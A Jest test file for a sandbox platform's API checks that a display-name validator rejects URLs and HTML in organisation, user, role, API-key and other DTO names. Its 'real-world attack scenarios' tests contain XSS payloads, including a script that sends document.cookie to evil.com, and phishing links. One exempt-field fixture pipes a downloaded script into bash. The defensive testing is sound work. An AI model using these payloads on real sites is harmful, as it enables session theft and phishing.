/*
 * Copyright Daytona Platforms Inc.
 * SPDX-License-Identifier: AGPL-3.0
 */

import 'reflect-metadata'
import { validate } from 'class-validator'
import { plainToInstance } from 'class-transformer'
import { CreateOrganizationDto } from '../../organization/dto/create-organization.dto'
import { CreateUserDto } from '../../user/dto/create-user.dto'
import { UpdateUserDto } from '../../user/dto/update-user.dto'
import { CreateSandboxDto } from '../../sandbox/dto/create-sandbox.dto'
import { CreateSnapshotDto } from '../../sandbox/dto/create-snapshot.dto'
import { CreateRunnerDto } from '../../sandbox/dto/create-runner.dto'
import { AdminCreateRunnerDto } from '../../admin/dto/create-runner.dto'
import { CreateOrganizationRoleDto } from '../../organization/dto/create-organization-role.dto'
import { UpdateOrganizationRoleDto } from '../../organization/dto/update-organization-role.dto'
import { CreateVolumeDto } from '../../sandbox/dto/create-volume.dto'
import { CreateBuildInfoDto } from '../../sandbox/dto/create-build-info.dto'
import { CreateDockerRegistryDto } from '../../docker-registry/dto/create-docker-registry.dto'
import { UpdateDockerRegistryDto } from '../../docker-registry/dto/update-docker-registry.dto'
import { CreateApiKeyDto } from '../../api-key/dto/create-api-key.dto'
import { CreateRegionDto } from '../../region/dto/create-region.dto'
import { OrganizationResourcePermission } from '../../organization/enums/organization-resource-permission.enum'
import { RegistryType } from '../../docker-registry/enums/registry-type.enum'

const URL_INPUT = 'https://evil.com'
const HTML_INPUT = '<script>alert(1)</script>'

function hasIsSafeDisplayStringError(errors: any[]): boolean {
  return errors.some((e) => e.constraints && 'IsSafeDisplayStringConstraint' in e.constraints)
}

describe('DTO @IsSafeDisplayString() integration tests — display name fields only', () => {
  describe('CreateOrganizationDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'My Organization',
        defaultRegionId: 'us-east-1',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: URL_INPUT,
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject HTML in name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: HTML_INPUT,
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should accept unicode name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: '\u00DCnternehmen GmbH',
        defaultRegionId: 'eu',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })
  })

  describe('CreateUserDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: "John O'Brien",
        email: 'john@example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: URL_INPUT,
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('UpdateUserDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(UpdateUserDto, {
        name: 'Jane Smith',
        email: 'jane@example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(UpdateUserDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateSandboxDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateSandboxDto, { name: 'my-sandbox' })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateSandboxDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateSnapshotDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateSnapshotDto, { name: 'ubuntu-4vcpu-8ram-100gb' })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateSnapshotDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateRunnerDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateRunnerDto, { regionId: 'us', name: 'runner-01' })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateRunnerDto, { regionId: 'us', name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('AdminCreateRunnerDto', () => {
    it('should accept valid name with URL fields exempt', async () => {
      const dto = plainToInstance(AdminCreateRunnerDto, {
        regionId: 'us',
        name: 'runner-01',
        apiKey: 'sk-123',
        apiVersion: '2',
        apiUrl: 'https://api.runner1.example.com',
        proxyUrl: 'https://proxy.runner1.example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name (inherited)', async () => {
      const dto = plainToInstance(AdminCreateRunnerDto, {
        regionId: 'us',
        name: URL_INPUT,
        apiKey: 'sk-123',
        apiVersion: '2',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateOrganizationRoleDto', () => {
    it('should accept valid name and description', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Maintainer',
        description: 'Can manage all resources',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: URL_INPUT,
        description: 'Valid',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject HTML in description', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Valid',
        description: HTML_INPUT,
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('UpdateOrganizationRoleDto', () => {
    it('should reject URL in name', async () => {
      const dto = plainToInstance(UpdateOrganizationRoleDto, {
        name: URL_INPUT,
        description: 'Valid',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateVolumeDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateVolumeDto, { name: 'my-data-volume' })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateVolumeDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateDockerRegistryDto', () => {
    it('should accept valid name with URL/password fields exempt', async () => {
      const dto = plainToInstance(CreateDockerRegistryDto, {
        name: 'my-registry',
        url: 'https://registry.example.com',
        username: 'admin',
        password: 'https://not-a-url<script>',
        registryType: RegistryType.ORGANIZATION,
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateDockerRegistryDto, {
        name: URL_INPUT,
        url: 'https://registry.example.com',
        username: 'admin',
        password: 'pass',
        registryType: RegistryType.ORGANIZATION,
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('UpdateDockerRegistryDto', () => {
    it('should reject URL in name', async () => {
      const dto = plainToInstance(UpdateDockerRegistryDto, {
        name: URL_INPUT,
        url: 'https://registry.example.com',
        username: 'admin',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateApiKeyDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: 'My API Key',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: URL_INPUT,
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateRegionDto', () => {
    it('should accept valid name with URL fields exempt', async () => {
      const dto = plainToInstance(CreateRegionDto, {
        name: 'us-east-1',
        proxyUrl: 'https://proxy.example.com',
        sshGatewayUrl: 'ssh://gateway.example.com',
        snapshotManagerUrl: 'https://snapshot.example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateRegionDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('exempt fields — no @IsSafeDisplayString()', () => {
    it('should accept URL in Dockerfile content', async () => {
      const dto = plainToInstance(CreateBuildInfoDto, {
        dockerfileContent: 'FROM node:14\nRUN curl https://example.com/install.sh | bash',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should accept URL in admin runner apiUrl/proxyUrl', async () => {
      const dto = plainToInstance(AdminCreateRunnerDto, {
        regionId: 'us',
        name: 'runner-1',
        apiKey: 'key-123',
        apiVersion: '2',
        apiUrl: 'https://api.runner1.example.com',
        proxyUrl: 'https://proxy.runner1.example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should accept URL in region URL fields', async () => {
      const dto = plainToInstance(CreateRegionDto, {
        name: 'us-east-1',
        proxyUrl: 'https://proxy.example.com',
        sshGatewayUrl: 'ssh://gateway.example.com:2222',
        snapshotManagerUrl: 'https://snapshot-manager.example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should accept password with URLs and HTML', async () => {
      const dto = plainToInstance(CreateDockerRegistryDto, {
        name: 'valid',
        url: 'https://registry.example.com',
        username: 'admin',
        password: 'https://not-a-url<script>',
        registryType: RegistryType.ORGANIZATION,
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })
  })

  describe('real-world attack scenarios', () => {
    it('should reject org name that causes email auto-linking', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'https://evil.com',
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject org name with embedded phishing URL', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'Legit Corp https://steal-creds.com',
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject user name with XSS payload', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: '<img src=x onerror=alert(document.cookie)>',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject sandbox name with www prefix', async () => {
      const dto = plainToInstance(CreateSandboxDto, { name: 'www.evil.com' })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject API key name with script injection', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject role description with HTML injection', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Admin',
        description: 'Full access <a href="https://phish.com">click here</a>',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('legitimate display names that should NOT break', () => {
    it('should accept names with special characters', async () => {
      const testCases = [
        'Daytona Platforms Inc.',
        "O'Reilly Media",
        'Smith & Associates',
        'Dept. of Engineering',
        'team-alpha_v2',
        'My Org (Test)',
        '#1 Company',
        '50% Off Corp',
      ]

      for (const name of testCases) {
        const dto = plainToInstance(CreateOrganizationDto, { name, defaultRegionId: 'us' })
        const errors = await validate(dto)
        expect(errors).toHaveLength(0)
      }
    })
  })
})
